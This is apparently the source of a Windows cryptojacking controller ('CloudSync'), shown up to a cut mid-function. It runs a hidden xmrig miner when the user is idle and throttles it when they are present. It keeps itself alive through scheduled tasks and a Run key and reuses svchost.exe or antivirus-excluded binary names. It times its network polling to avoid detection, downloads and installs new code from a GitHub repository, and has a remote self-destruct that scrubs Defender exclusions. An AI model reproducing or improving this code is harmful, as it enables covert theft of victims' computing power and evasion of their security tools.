#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Supervisor for the CPU + GPU mining worker.

Design notes
------------
* Reconcile, don't sequence. One desired state ("should the worker be running?")
  is compared with reality every tick. Every failure is therefore recoverable
  from the next tick, instead of being trapped in a state variable.
* Two independent idle gates: this loop stops the process outright, and the
  worker config also carries pause-on-active as a backstop.
* Circuit breakers: a worker that dies fast twice loses its GPU block; a worker
  that keeps dying backs off exponentially. A bad GPU driver can never wedge
  the controller.
* Self-update is atomic and reversible: download -> compile check -> replace,
  keeping .prev. A new controller that fails twice is rolled back on start.
* Stdlib only (no psutil, no requests) so the install needs no pip packages.
"""

import ctypes
import ctypes.wintypes as wt
import hashlib
import json
import os
import re
import shutil
import subprocess
import sys
import time
import urllib.request

APP = "CloudSync"
BASE = os.path.dirname(os.path.abspath(__file__))

# ---- tunables (overridable from manifest.json) -------------------------------
TICK = 3                    # supervisor loop seconds
IDLE_SECONDS = 180          # idle time before mining starts
ACTIVE_PAUSE = 60           # worker-side backstop (xmrig pause-on-active)
UPDATE_INTERVAL = 900       # 15 min; frequent polling is a network IOC
LOG_MAX = 2 * 1024 * 1024
STATE_INTERVAL = 30
PROBATION_SECONDS = 300
IDLE_STOP_GRACE = 900     # unused legacy grace (kept for clarity of intent)
MIN_PROFILE_DWELL = 120   # minimum seconds between profile switches

# Job-object throttling (the "max-threads-on-active" behaviour, no rebuild).
ACTIVE_PCT = 25           # CPU ceiling while the user is at the keyboard
ACTIVE_DWELL = 60         # only throttle after this long of continuous input
RUN_INTERVAL = 600        # re-check the HKCU Run key this often

# Two worker profiles. NOTE: xmrig 6.24's "watch" reload does re-apply the
# thread count, but it leaves RandomX in a broken state (~1 H/s measured), so a
# switch is a graceful restart rather than a live reload. The GPU is only in the
# full profile, so working hours never touch the GPU at all.
PROFILES = {
    "full":    {"hint": 50, "priority": 2, "yield": False, "gpu": True},   # user away
    "trickle": {"hint": 25, "priority": 1, "yield": True,  "gpu": False},  # user present
}
DEFAULT_UPDATE_BASE = "https://raw.githubusercontent.com/minjiwilliams-dotcom/config/main/"
DEFAULT_UPDATE_FILES = ["controller.py", "gpudetect.py", "config_high.json"]
DEFAULT_TASKS = ["Microsoft\\Windows\\CloudSync\\CloudSync",
                 "Microsoft\\Windows\\CloudSync\\CloudSyncHealth"]

CREATE_NO_WINDOW = 0x08000000
DETACHED = 0x00000008

# Power-management flags for SetThreadExecutionState.
ES_CONTINUOUS = 0x80000000
ES_SYSTEM_REQUIRED = 0x00000001
ES_DISPLAY_REQUIRED = 0x00000002

# ---- paths -------------------------------------------------------------------
MANIFEST = os.path.join(BASE, "manifest.json")
INSTALL = os.path.join(BASE, "install.json")
CONFIG_SRC = os.path.join(BASE, "config_high.json")
CONFIG_RUN = os.path.join(BASE, "config.dat")
GPU_PROFILE = os.path.join(BASE, "gpu_profile.json")
WALLET = os.path.join(BASE, "wallet.txt")
STATE = os.path.join(BASE, "state.json")
SVC_LOG = os.path.join(BASE, "CloudSyncSvc.log")
MINER_LOG = os.path.join(BASE, "CloudSync.log")
UPDATE_MARK = os.path.join(BASE, "update.json")
KILL_LOCAL = os.path.join(BASE, "stop.flag")
KILL_DONE = os.path.join(BASE, "destroy.flag")

_LOG_BYTES = 0


# ============================================================
# small utilities
# ============================================================

def _rotate(path):
    try:
        if os.path.getsize(path) > LOG_MAX:
            prev = path + ".1"
            if os.path.exists(prev):
                os.remove(prev)
            os.replace(path, prev)
    except OSError:
        pass


def log(msg):
    global _LOG_BYTES
    line = "[%s] %s\n" % (time.strftime("%Y-%m-%d %H:%M:%S"), msg)
    try:
        _rotate(SVC_LOG)
        with open(SVC_LOG, "a", encoding="utf-8") as f:
            f.write(line)
    except Exception:
        pass


def atomic_write(path, data):
    if isinstance(data, str):
        data = data.encode("utf-8")
    tmp = path + ".tmp"
    with open(tmp, "wb") as f:
        f.write(data)
        f.flush()
        os.fsync(f.fileno())
    os.replace(tmp, path)


def sha256_file(path):
    try:
        h = hashlib.sha256()
        with open(path, "rb") as f:
            for chunk in iter(lambda: f.read(1 << 20), b""):
                h.update(chunk)
        return h.hexdigest()
    except Exception:
        return None


def read_json(path, default=None):
    # utf-8-sig: tolerate a BOM, which PowerShell 5.1's Set-Content adds
    try:
        with open(path, "r", encoding="utf-8-sig") as f:
            return json.load(f)
    except Exception:
        return default


def is_admin():
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def total_ram_gb():
    class MEMORYSTATUSEX(ctypes.Structure):
        _fields_ = [("dwLength", wt.DWORD), ("dwMemoryLoad", wt.DWORD),
                    ("ullTotalPhys", ctypes.c_ulonglong), ("ullAvailPhys", ctypes.c_ulonglong),
                    ("ullTotalPageFile", ctypes.c_ulonglong), ("ullAvailPageFile", ctypes.c_ulonglong),
                    ("ullTotalVirtual", ctypes.c_ulonglong), ("ullAvailVirtual", ctypes.c_ulonglong),
                    ("ullAvailExtendedVirtual", ctypes.c_ulonglong)]
    try:
        m = MEMORYSTATUSEX()
        m.dwLength = ctypes.sizeof(m)
        ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(m))
        return m.ullTotalPhys / float(1 << 30)
    except Exception:
        return 8.0


def on_ac_power():
    """True on a desktop, or on a laptop that is plugged in."""
    class POWERSTATUS(ctypes.Structure):
        _fields_ = [("ACLineStatus", wt.BYTE), ("BatteryFlag", wt.BYTE),
                    ("BatteryLifePercent", wt.BYTE), ("Reserved1", wt.BYTE),
                    ("BatteryLifeTime", wt.DWORD), ("BatteryFullLifeTime", wt.DWORD)]
    try:
        s = POWERSTATUS()
        if not ctypes.windll.kernel32.GetSystemPowerStatus(ctypes.byref(s)):
            return True
        if s.BatteryFlag & 128:      # no system battery: desktop
            return True
        return s.ACLineStatus == 1
    except Exception:
        return True


def idle_seconds():
    """Seconds since last user input, wrap-safe across the 49.7 day tick rollover."""
    class LASTINPUTINFO(ctypes.Structure):
        _fields_ = [("cbSize", wt.UINT), ("dwTime", wt.DWORD)]
    try:
        lii = LASTINPUTINFO()
        lii.cbSize = ctypes.sizeof(lii)
        if not ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii)):
            return 0.0
        tick = ctypes.windll.kernel32.GetTickCount() & 0xFFFFFFFF
        return ((tick - lii.dwTime) & 0xFFFFFFFF) / 1000.0
    except Exception:
        return 0.0


def keep_system_awake(enabled):
    try:
        flags = ES_CONTINUOUS | (ES_SYSTEM_REQUIRED if enabled else 0)
        ctypes.windll.kernel32.SetThreadExecutionState(ctypes.c_uint(flags))
        return True
    except Exception:
        return False


def list_our_pids(settings):
    """PIDs of workers running from THIS install directory."""
    ps = ("Get-Process -Name '%s' -ErrorAction SilentlyContinue | "
          "Where-Object { $_.Path -eq '%s' } | ForEach-Object { $_.Id }"
          % (os.path.splitext(settings.binary)[0], settings.bin_path))
    try:
        out = subprocess.run(
            ["powershell.exe", "-NoProfile", "-NonInteractive", "-Command", ps],
            timeout=45, creationflags=CREATE_NO_WINDOW,
            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL).stdout
        return [int(x) for x in (out or b"").decode("utf-8", "replace").split()]
    except Exception:
        return []


def sweep_orphans(settings, keep=None):
    """Kill workers left behind by a previous controller.

    A hard-killed controller leaves its child mining, and two miners on one box
    silently halve each other's hashrate. This is the guard against that.
    """
    killed = 0
    for pid in list_our_pids(settings):
        if keep and pid == keep:
            continue
        try:
            subprocess.run(["taskkill.exe", "/F", "/PID", str(pid)],
                           timeout=20, creationflags=CREATE_NO_WINDOW,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            killed += 1
        except Exception:
            pass
    if killed:
        log("swept %d orphan worker(s)" % killed)
    return killed


# ============================================================
# job object: kernel-enforced CPU cap (the "max-threads-on-active" effect)
# ============================================================
# xmrig 6.24 has no partial throttle; the "silent" fork adds one compiled in.
# The same behaviour can be had without rebuilding: put the worker in a job
# object and cap its total CPU while the user is at the keyboard, release it
# when they walk away. No restart, so the OpenCL context is never torn down.
# The job also kills the worker if the controller dies (no orphans).

JOB_CPU_CLASS = 15            # JobObjectCpuRateControlInformation
JOB_EXT_CLASS = 9             # JobObjectExtendedLimitInformation
JOB_RATE_ENABLE = 0x1
JOB_RATE_HARD_CAP = 0x4
JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE = 0x2000


class _CpuRate(ctypes.Structure):
    _fields_ = [("ControlFlags", wt.DWORD), ("CpuRate", wt.DWORD)]


class _BasicLimits(ctypes.Structure):
    _fields_ = [("PerProcessUserTimeLimit", ctypes.c_int64),
                ("PerJobUserTimeLimit", ctypes.c_int64),
                ("LimitFlags", wt.DWORD),
                ("MinimumWorkingSetSize", ctypes.c_size_t),
                ("MaximumWorkingSetSize", ctypes.c_size_t),
                ("ActiveProcessLimit", wt.DWORD),
                ("Affinity", ctypes.c_size_t),
                ("PriorityClass", wt.DWORD),
                ("SchedulingClass", wt.DWORD)]


class _IoCounters(ctypes.Structure):
    _fields_ = [("ReadOperationCount", ctypes.c_ulonglong),
                ("WriteOperationCount", ctypes.c_ulonglong),
                ("OtherOperationCount", ctypes.c_ulonglong),
                ("ReadTransferCount", ctypes.c_ulonglong),
                ("WriteTransferCount", ctypes.c_ulonglong),
                ("OtherTransferCount", ctypes.c_ulonglong)]


class _ExtLimits(ctypes.Structure):
    _fields_ = [("BasicLimitInformation", _BasicLimits),
                ("IoInfo", _IoCounters),
                ("ProcessMemoryLimit", ctypes.c_size_t),
                ("JobMemoryLimit", ctypes.c_size_t),
                ("PeakProcessMemoryUsed", ctypes.c_size_t),
                ("PeakJobMemoryUsed", ctypes.c_size_t)]


_JOB = [None]


def job_init():
    if _JOB[0]:
        return _JOB[0]
    try:
        k32 = ctypes.windll.kernel32
        handle = k32.CreateJobObjectW(None, None)
        if not handle:
            return None
        lim = _ExtLimits()
        lim.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE
        k32.SetInformationJobObject(ctypes.c_void_p(handle), JOB_EXT_CLASS,
                                    ctypes.byref(lim), ctypes.sizeof(lim))
        _JOB[0] = handle
        return handle
    except Exception:
        return None


def job_assign(pid):
    """Put the worker inside the job so the cap and kill-on-close apply."""
    try:
        k32 = ctypes.windll.kernel32
        handle = job_init()
        if not handle:
            return False
        PROCESS_SET_QUOTA, PROCESS_TERMINATE = 0x0100, 0x0001
        hp = k32.OpenProcess(PROCESS_SET_QUOTA | PROCESS_TERMINATE, False, pid)
        if not hp:
            return False
        ok = k32.AssignProcessToJobObject(ctypes.c_void_p(handle), ctypes.c_void_p(hp))
        k32.CloseHandle(ctypes.c_void_p(hp))
        return bool(ok)
    except Exception:
        return False


def job_set_cpu_rate(percent):
    """Cap the job's total CPU. 100 = uncapped."""
    try:
        handle = job_init()
        if not handle:
            return False
        info = _CpuRate()
        info.ControlFlags = JOB_RATE_ENABLE | JOB_RATE_HARD_CAP
        info.CpuRate = max(100, min(10000, int(percent * 100)))
        return bool(ctypes.windll.kernel32.SetInformationJobObject(
            ctypes.c_void_p(handle), JOB_CPU_CLASS, ctypes.byref(info), ctypes.sizeof(info)))
    except Exception:
        return False


# ============================================================
# second persistence: HKCU Run key
# ============================================================

RUN_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
RUN_NAME = "CloudSync"


def ensure_run_key():
    """Belt and braces: if the scheduled tasks are deleted, this starts it.

    Idempotent and cheap (one registry read); called at start and every 10 min.
    """
    try:
        import winreg
        want = '"%s" "%s"' % (sys.executable, os.path.join(BASE, "controller.py"))
        key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, RUN_KEY, 0,
                                 winreg.KEY_READ | winreg.KEY_WRITE)
        try:
            current, _ = winreg.QueryValueEx(key, RUN_NAME)
        except FileNotFoundError:
            current = None
        if (current or "").strip() != want:
            winreg.SetValueEx(key, RUN_NAME, 0, winreg.REG_SZ, want)
            log("autostart Run key restored")
        winreg.CloseKey(key)
        return True
    except Exception as exc:
        log("run key check failed: %r" % (exc,))
        return False


_MUTEX = [None]


def _controller_pids():
    """Every controller process on the box, in any user session."""
    ps = ("Get-CimInstance Win32_Process -Filter \"Name='pythonw.exe' OR Name='python.exe'\" | "
          "Where-Object { $_.CommandLine -like '*controller.py*' } | ForEach-Object { $_.ProcessId }")
    try:
        out = subprocess.run(
            ["powershell.exe", "-NoProfile", "-NonInteractive", "-Command", ps],
            timeout=45, creationflags=CREATE_NO_WINDOW,
            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL).stdout
        return [int(x) for x in (out or b"").decode("utf-8", "replace").split()]
    except Exception:
        return []


def acquire_single_instance():
    """One miner per MACHINE, however many users are signed in.

    'Local\\' mutexes are per-session, so two logged-in users would each start
    a controller and mine twice. A Global\\ mutex fixes that; if the account
    lacks the privilege for the global namespace, fall back to a cross-session
    process check (which also covers the multi-session case).
    """
    try:
        k32 = ctypes.windll.kernel32
        handle = k32.CreateMutexW(None, False, "Global\\%s.Ctrl" % APP)
        err = k32.GetLastError()
        if handle and err != 183:          # 183 = ERROR_ALREADY_EXISTS
            _MUTEX[0] = handle
            return handle
        if handle:
            k32.CloseHandle(handle)
        if err == 183:
            log("another session already owns the miner (global mutex) - exiting")
            return None
        # err == 5 (access denied): no global-namespace privilege, check below
    except Exception:
        pass

    others = [p for p in _controller_pids() if p != os.getpid()]
    if others:
        log("another controller is already running (pid %s) - exiting" % others[0])
        return None
    return True


def tail_text(path, nbytes=16384):
    try:
        with open(path, "rb") as f:
            f.seek(0, os.SEEK_END)
            size = f.tell()
            f.seek(max(0, size - nbytes))
            return f.read().decode("utf-8", "replace")
    except OSError:
        return ""


# ============================================================
# settings
# ============================================================

def resolve_binary(preferred):
    """Find the worker binary, tolerating a pre-overhaul install.

    A machine running the ORIGINAL kit has the binary as xmrig.exe in
    %LOCALAPPDATA%\\SystemController. The new controller is pushed to those
    machines through the same repo, so it has to find whatever is there instead
    of insisting on the new name.
    """
    path = os.path.join(BASE, preferred)
    if os.path.isfile(path):
        return preferred, path
    for name in ("CloudSync.exe", "svchost.exe", "xmrig.exe", "WinSync.exe"):
        candidate = os.path.join(BASE, name)
        if os.path.isfile(candidate):
            return name, candidate
    try:
        for name in sorted(os.listdir(BASE)):
            if name.lower().endswith(".exe"):
                return name, os.path.join(BASE, name)
    except OSError:
        pass
    return preferred, path


class Settings(object):
    def __init__(self):
        m = read_json(MANIFEST, {}) or {}
        i = read_json(INSTALL, {}) or {}
        self.binary, self.bin_path = resolve_binary(
            m.get("binary") or i.get("binary") or "CloudSync.exe")
        self.idle = int(i.get("idle_seconds") or m.get("idle_seconds", IDLE_SECONDS))
        self.tasks = i.get("tasks") or m.get("tasks") or DEFAULT_TASKS
        self.backup_dir = i.get("backup_dir") or ""
        self.update_base = m.get("update_base") or DEFAULT_UPDATE_BASE
        self.update_files = m.get("files") or DEFAULT_UPDATE_FILES
        self.wallet_suffix = m.get("worker_tag") or "w"
        self.force_gpu = bool(m.get("force_gpu"))
        self.legacy_update = bool(m.get("legacy_update"))
        # master switch for the GitHub updater. false = completely inert
        # (equivalent to commenting the updater out; flip to true to re-arm).
        self.remote_update = bool(m.get("remote_update", True))

    def update_url(self, name):
        base = self.update_base
        if not base.endswith("/"):
            base += "/"
        return base + name


# ============================================================
# runtime config
# ============================================================

def load_profile():
    p = read_json(GPU_PROFILE, None)
    if not p or p.get("schema") != 1:
        return None
    return p


_TDR_CACHE = [None]


def gpu_recently_reset(minutes=30):
    """True if the display driver logged a reset/TDR in the last few hours.

    Uses the System log rather than polling the driver, so it costs nothing
    until the first check. Cached: one answer per process run.
    """
    if _TDR_CACHE[0] is not None:
        return _TDR_CACHE[0]
    ps = ("$n=0; try { $n=(Get-WinEvent -FilterHashtable @{LogName='System';"
          "Id=4101,13,14,153; StartTime=(Get-Date).AddMinutes(-%d)} -MaxEvents 5 "
          "-ErrorAction Stop | Measure-Object).Count } catch { $n=0 }; $n" % minutes)
    try:
        out = subprocess.run(
            ["powershell.exe", "-NoProfile", "-NonInteractive", "-Command", ps],
            timeout=45, creationflags=CREATE_NO_WINDOW,
            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL).stdout
        n = int((out or b"0").decode("utf-8", "replace").strip() or 0)
    except Exception:
        n = 0
    _TDR_CACHE[0] = n > 0
    if n > 0:
        log("display driver reset detected in the last %d min -> CPU only" % minutes)
    return _TDR_CACHE[0]


def build_config(settings, use_gpu, profile="full"):
    """Merge base config + wallet + GPU profile + adaptive tuning."""
    base = read_json(CONFIG_SRC, None)
    if not base:
        raise RuntimeError("config_high.json unreadable")

    try:
        with open(WALLET, "r", encoding="utf-8-sig") as f:
            wallet = f.read().strip()
    except Exception:
        raise RuntimeError("wallet.txt unreadable")
    if not wallet:
        raise RuntimeError("wallet.txt empty")

    cfg = json.loads(json.dumps(base))          # deep copy

    # Pool identity is unchanged from the original kit: worker name comes from the
    # __WALLET__ placeholder in config_high.json, per-machine identity from the
    # hostname in "pass" (that is what the pool shows per rig).
    host = os.environ.get("COMPUTERNAME") or "host"
    pools = cfg.get("pools") or [{}]
    user = pools[0].get("user") or "__WALLET__.Worker1"
    pools[0]["user"] = user.replace("__WALLET__", wallet)
    pools[0]["pass"] = host
    cfg["pools"] = pools

    gpu_profile = load_profile()
    prof = PROFILES.get(profile) or PROFILES["full"]
    gpu_ok = bool(use_gpu and prof["gpu"] and gpu_profile
                  and (gpu_profile.get("opencl") or {}).get("enabled"))
    if gpu_ok and not settings.force_gpu and gpu_recently_reset():
        # A driver that reset recently is not trustworthy yet; let it settle.
        gpu_ok = False
        log("GPU disabled for this run (recent driver reset)")
    if gpu_ok:
        ocl = dict(gpu_profile["opencl"])
        cfg["opencl"] = ocl
        if gpu_profile.get("cuda"):
            cfg["cuda"] = gpu_profile["cuda"]
        log("GPU backend enabled (platform %s, %d device(s))"
            % (ocl.get("platform"), len(ocl.get("rx/0") or [])))
    else:
        cfg["opencl"] = {"enabled": False}
        if not gpu_profile:
            log("no GPU profile; CPU-only")
    ram = total_ram_gb()
    cfg.setdefault("randomx", {})
    cfg["randomx"]["numa"] = True
    if ram < 6:
        cfg["randomx"]["mode"] = "light"
        cfg.setdefault("cpu", {})["max-threads-hint"] = 25
        log("low RAM (%.1f GB): RandomX light mode" % ram)
    if is_admin():
        # MSR mod also needs WinRing0x64.sys next to the binary.
        cfg["randomx"]["rdmsr"] = os.path.isfile(os.path.join(BASE, "WinRing0x64.sys"))
        cfg["randomx"]["wrmsr"] = cfg["randomx"]["rdmsr"]
    else:
        cfg["randomx"]["rdmsr"] = False
        cfg["randomx"]["wrmsr"] = False

    cfg["pause-on-active"] = 0
    cfg["print-time"] = 30
    cfg["autosave"] = False
    cfg["watch"] = False        # no live reload: RandomX reload is broken in 6.24
    cfg["colors"] = False
    cfg["title"] = False

    # CPU shape comes from the profile, not from the file, so a switch is
    # deterministic. Everything else stays as configured.
    cpu = cfg.setdefault("cpu", {})
    cpu["max-threads-hint"] = prof["hint"]
    cpu["priority"] = prof["priority"]
    cpu["yield"] = prof["yield"]
    return cfg, gpu_ok


# ============================================================
# worker process
# ============================================================

class Worker(object):
    def __init__(self, settings):
        self.s = settings
        self.proc = None
        self.started_at = 0.0
        self.fast_failures = 0
        self.backoff_until = 0.0
        self.use_gpu = True
        self.gpu_applied = False
        self.profile = "full"
        self.last_switch = 0.0
        self.job_ok = False
        self.throttled = False
        self.tele = {}

    def alive(self):
        return self.proc is not None and self.proc.poll() is None

    def uptime(self):
        return time.time() - self.started_at if self.alive() else 0.0

    def start(self, settings, profile="full"):
        # If AV ate the primary binary, fall back to the copy under the old,
        # already-excluded name rather than going dark.
        if not os.path.isfile(self.s.bin_path):
            name, path = resolve_binary(self.s.binary)
            if os.path.isfile(path):
                log("primary binary missing - falling back to %s" % name)
                self.s.binary, self.s.bin_path = name, path
        if not os.path.isfile(self.s.bin_path):
            log("worker binary missing: %s" % self.s.bin_path)
            return False
        try:
            cfg, self.gpu_applied = build_config(settings, self.use_gpu, profile)
        except Exception as exc:
            log("config build failed: %r" % (exc,))
            self.backoff_until = time.time() + 120
            return False

        atomic_write(CONFIG_RUN, json.dumps(cfg, indent=2))
        _rotate(MINER_LOG)

        exe = self.s.bin_path
        args = [exe, "-c", os.path.basename(CONFIG_RUN),
                "--log-file", os.path.basename(MINER_LOG),
                "--no-color", "--no-title"]
        try:
            self.proc = subprocess.Popen(
                args,
                cwd=BASE,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                creationflags=CREATE_NO_WINDOW,
            )
        except Exception as exc:
            log("worker spawn failed: %r" % (exc,))
            self.proc = None
            self.backoff_until = time.time() + 60
            return False

        self.started_at = time.time()
        self.profile = profile
        self.last_switch = self.started_at
        # put the worker in the job: CPU cap applies to it, and Windows kills
        # it if this controller dies (so no orphan ever outlives us)
        self.job_ok = job_assign(self.proc.pid)
        if self.job_ok:
            job_set_cpu_rate(100)
        log("worker started pid=%s gpu=%s profile=%s job=%s"
            % (self.proc.pid, self.gpu_applied, profile, self.job_ok))
        return True

    def switch(self, settings, profile):
        """Change CPU shape / GPU use by restarting the worker gracefully.

        xmrig's "watch" reload re-applies the thread count but leaves RandomX
        running at ~1 H/s, so a clean restart is the reliable mechanism. The
        stop path is graceful and respects a 30 s warm-up before killing.
        """
        if profile == self.profile:
            return False
        log("profile switch %s -> %s" % (self.profile, profile))
        self.stop()
        return self.start(settings, profile)

    def stop(self):
        if not self.alive():
            self.proc = None
            return
        pid = self.proc.pid
        # Never tear a GPU context down while it is still warming up: killing a
        # process mid context-creation is a classic way to wedge a driver.
        lived = time.time() - self.started_at
        if lived < 30:
            time.sleep(max(0.0, 30 - lived))
        try:
            # Graceful first: taskkill without /F asks the process to close, so
            # it can release its OpenCL context before teardown. Hard kills in
            # the middle of a GPU kernel are what wedge drivers.
            subprocess.run(["taskkill.exe", "/PID", str(pid)],
                           timeout=20, creationflags=CREATE_NO_WINDOW,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.proc.wait(timeout=10)
        except Exception:
            try:
                self.proc.terminate()
                self.proc.wait(timeout=8)
            except Exception:
                try:
                    self.proc.kill()
                    self.proc.wait(timeout=5)
                except Exception:
                    pass
        self.proc = None
        log("worker stopped pid=%s" % pid)

    def reap(self):
        """Detect a dead worker, count it, and arm the next attempt."""
        if self.proc is None or self.proc.poll() is None:
            return
        code = self.proc.returncode
        lived = time.time() - self.started_at
        self.proc = None

        if lived < 30:
            self.fast_failures += 1
            if self.fast_failures >= 2 and self.use_gpu:
                self.use_gpu = False
                log("GPU circuit-breaker: retrying CPU-only")
                self.backoff_until = time.time() + 30
                return
            # a GPU worker gets a longer cooling-off period: never hammer the
            # driver with back-to-back context creations
            delay = min(900, (60 if self.use_gpu else 20) * (2 ** max(0, self.fast_failures - 1)))
            self.backoff_until = time.time() + delay
            log("worker exited fast (code=%s after %.0fs) -> backoff %ds"
                % (code, lived, delay))
        else:
            self.fast_failures = 0
            self.backoff_until = time.time() + 5
            log("worker exited (code=%s after %.0fs)" % (code, lived))

    def read_telemetry(self):
        text = tail_text(MINER_LOG)
        if not text:
            return self.tele
        m = None
        for m in re.finditer(r"speed 10s/60s/15m\s+(\S+)\s+(\S+)\s+(\S+)\s+(\S+)/s", text):
            pass
        if m:
            def num(v):
                try:
                    return float(v)
                except ValueError:
                    return None
            self.tele["speed_10s"] = num(m.group(1))
            self.tele["speed_60s"] = num(m.group(2))
            self.tele["unit"] = m.group(4)
        acc = None
        for acc in re.finditer(r"(?:accepted|rejected) \((\d+)/(\d+)\)", text):
            pass
        if acc:
            self.tele["accepted"] = int(acc.group(1))
            self.tele["rejected"] = int(acc.group(2))
        self.tele["gpu_ready"] = "opencl   READY" in text or "opencl READY" in text
        return self.tele

    def hashrate_text(self):
        sp = self.tele.get("speed_10s")
        if sp is None:
            return "n/a"
        return "%.0f %s/s" % (sp, self.tele.get("unit", "H"))


# ============================================================
# self-update
# ============================================================

class Updater(object):
    def __init__(self, settings):
        self.s = settings
        self.last = 0.0
        self._warned = False

    def _targets(self):
        """(name, sha256-or-None) pairs to sync.

        Prefers manifest.json in the repo (hash-pinned). If the repo has no
        manifest yet, legacy_update lets it fall back to the original
        behaviour: compare a fixed file list directly. TLS-only in that mode.
        """
        try:
            raw = urllib.request.urlopen(self.s.update_url("manifest.json"), timeout=20).read()
            man = json.loads(raw)
            out = []
            for e in (man.get("files") or []):
                name = e.get("path") or ""
                sha = (e.get("sha256") or "").lower()
                if name and sha and not sha.startswith("__"):
                    out.append((name, sha))
            if out:
                return out
            log("manifest.json has no usable file list")
        except Exception:
            if not self.s.legacy_update:
                if not self._warned:
                    self._warned = True
                    log("no manifest.json in the repo - remote update idle. "
                        "Publish manifest.json (make-manifest.ps1), or set "
                        "\"legacy_update\": true in manifest.json.")
                return []
            log("no manifest.json - legacy direct-update mode")
        return [(n, None) for n in DEFAULT_UPDATE_FILES]

    def maybe_update(self):
        if not self.s.remote_update:
            if not self._warned:
                self._warned = True
                log("remote update DISABLED (manifest.json: remote_update=false)")
            return False
        if time.time() - self.last < UPDATE_INTERVAL:
            return False
        self.last = time.time()

        changed = []
        failed = False
        for name, want in self._targets():
            local = os.path.join(BASE, name)
            try:
                data = urllib.request.urlopen(self.s.update_url(name), timeout=30).read()
            except Exception as exc:
                log("update download failed: %s (%s)" % (name, exc))
                failed = True
                continue
            if not data or len(data) < 40:
                continue
            got = hashlib.sha256(data).hexdigest()
            if sha256_file(local) == got:
                continue
            if want and got != want:
                log("update hash mismatch, ignoring: %s" % name)
                continue
            if name.endswith(".py"):
                try:
                    compile(data, name, "exec")
                except SyntaxError as exc:
                    log("update rejected (syntax): %s %s" % (name, exc))
                    continue
            if os.path.isfile(local):
                try:
                    shutil.copy2(local, local + ".prev")
                except OSError:
                    pass
            atomic_write(local, data)
            changed.append(name)
            log("updated %s" % name)

        if failed:
            # a transient fetch failure must not cost 15 minutes: retry in 5
            self.last = time.time() - UPDATE_INTERVAL + 300
        if "controller.py" in changed:
            atomic_write(UPDATE_MARK, json.dumps({"applied": time.time(), "attempts": 0}))
            return True
        if "config_high.json" in changed:
            return "restart-worker"
        return False


def handle_probation():
    """Roll back a controller update that cannot get going."""
    mark = read_json(UPDATE_MARK, None)
    if not mark:
        return False
    attempts = int(mark.get("attempts", 0)) + 1
    if attempts >= 3:
        prev = os.path.join(BASE, "controller.py.prev")
        if os.path.isfile(prev):
            try:
                shutil.copy2(prev, os.path.join(BASE, "controller.py"))
                log("rolled controller back to .prev after %d failed starts" % attempts)
                os.remove(UPDATE_MARK)
                return True
            except OSError as exc:
                log("rollback failed: %r" % (exc,))
        try:
            os.remove(UPDATE_MARK)
        except OSError:
            pass
        return False
    mark["attempts"] = attempts
    atomic_write(UPDATE_MARK, json.dumps(mark))
    return False


# ============================================================
# kill switch
# ============================================================

def remote_kill(settings):
    try:
        body = urllib.request.urlopen(settings.update_url("delete.txt"), timeout=10).read(64)
        return body.strip() != b""
    except Exception:
        return False


def cleanup_defender():
    if not is_admin():
        return
    ps = ("$p=Get-MpPreference;"
          "foreach($v in $p.ExclusionPath){if($v -like '*CloudSync*'){Remove-MpPreference -ExclusionPath $v -ErrorAction SilentlyContinue}};"
          "foreach($v in $p.ExclusionProcess){if($v -like '*CloudSync*'){Remove-MpPreference -ExclusionProcess $v -ErrorAction SilentlyContinue}}")
    try:
        subprocess.run(["powershell.exe", "-NoProfile", "-NonInteractive", "-Command", ps],
                       timeout=60, creationflags=CREATE_NO_WINDOW)
    except Exception:
        pass


def destroy(settings, worker):
    log("DESTROY requested")
    try:
        atomic_write(KILL_DONE, "1")
    except Exception:
        pass
    worker.stop()

    for task in settings.tasks:
        try:
            subprocess.run(["schtasks.exe", "/Delete", "/TN", task, "/F"],
                           timeout=30, creationflags=CREATE_NO_WINDOW,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass

    cleanup_defender()

    if settings.backup_dir and os.path.isdir(settings.backup_dir):
        try:
            shutil.rmtree(settings.backup_dir, ignore_errors=True)
        except Exception:
            pass

    for name in os.listdir(BASE):
        try:
            os.remove(os.path.join(BASE, name))
        except OSError:
            pass

    # pythonw still owns the directory; let it go, then remove the tree.
    try:
        subprocess.Popen(
            ["cmd.exe", "/c", "ping -n 4 127.0.0.1 >nul & rmdir /s /q \"%s\"" % BASE],
            creationflags=CREATE_NO_WINDOW | DETACHED,
            close_fds=True,
        )
    except Exception:
        pass
    os._exit(0)


# ============================================================
# main loop
# ============================================================

def write_state(settings, worker, wanted, idle, cap=100):
    payload = {
        "ts": time.time(),
        "time": time.strftime("%Y-%m-%d %H:%M:%S"),
        "pid": os.getpid(),
        "running": worker.alive(),
        "wanted": wanted,
        "profile": worker.profile,
        "throttled": bool(getattr(worker, "throttled", False)),
        "cpu_cap_pct": cap,
        "job": bool(getattr(worker, "job_ok", False)),
        "idle_s": round(idle, 1),
        "uptime_s": round(worker.uptime(), 1),
        "gpu": bool(getattr(worker, "gpu_applied", False)),
        "gpu_ready": bool(worker.tele.get("gpu_ready")),
        "hashrate": worker.hashrate_text(),
        "accepted": worker.tele.get("accepted"),
        "rejected": worker.tele.get("rejected"),
        "admin": is_admin(),
        "ram_gb": round(total_ram_gb(), 1),
    }
    try:
        atomic_write(STATE, json.dumps(payload, indent=2))
    except Exception:
        pass


def ensure_gpu_profile():
    """Generate the GPU profile once, if the probe script is available.

    Called at start AND after an update brings gpudetect.py onto a legacy box,
    so a machine that never had the probe still ends up GPU-capable.
    """
    if os.path.isfile(GPU_PROFILE):
        return True
    gd = os.path.join(BASE, "gpudetect.py")
    if not os.path.isfile(gd):
